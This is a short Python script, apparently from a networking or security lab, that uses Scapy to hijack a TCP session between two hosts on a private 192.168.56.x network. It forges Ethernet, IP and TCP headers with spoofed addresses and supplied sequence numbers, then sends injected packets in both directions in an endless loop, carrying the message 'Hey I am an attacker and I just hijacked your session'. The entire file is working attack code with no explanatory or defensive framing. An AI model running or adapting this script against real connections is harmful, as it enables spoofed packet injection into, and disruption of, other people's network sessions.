import sys
import os
import random
from scapy.all import *



def main1(i):
	src_ip="192.168.56.102"
	dest_ip="192.168.56.103"
	src_mac="08:00:27:1A:C1:21"
	dest_mac="08:00:27:36:72:04"
	src_port=int(sys.argv[1])	
	dest_port=int(sys.argv[2])
	seq_no=int(sys.argv[3])+i
	ack_no=int(sys.argv[4])+i
	send_sessionHijack_packet(src_ip,dest_ip,src_mac,dest_mac,src_port,dest_port,seq_no,ack_no)
	send_sessionHijack_packet(dest_ip,src_ip,dest_mac,src_mac,dest_port,src_port,ack_no,seq_no)
	#send_rst_packet(dest_ip,src_ip,dest_mac,src_mac)





def send_sessionHijack_packet(src_ip,dest_ip,src_mac,dest_mac,src_port,dest_port,seq_no,ack_no):
	eth_h=Ether(src=src_mac,dst=dest_mac)
	ip_h=IP(src=src_ip,dst=dest_ip)
	
	
	tcp_h=TCP(flags="PA",sport=src_port,dport=dest_port,seq=seq_no,ack=ack_no)
	data="Hey I am an attacker and I just hijacked your session"
	pkt=eth_h/ip_h/tcp_h/Raw(load=data) 
	sendp(pkt,iface="eth13") 
	#print "sending packet with seq. no. "+ str(seq_no) +" and to port no. " +str(dest_port)

	
	


i=0
while i>=0:
	main1(i)
	i=i+1
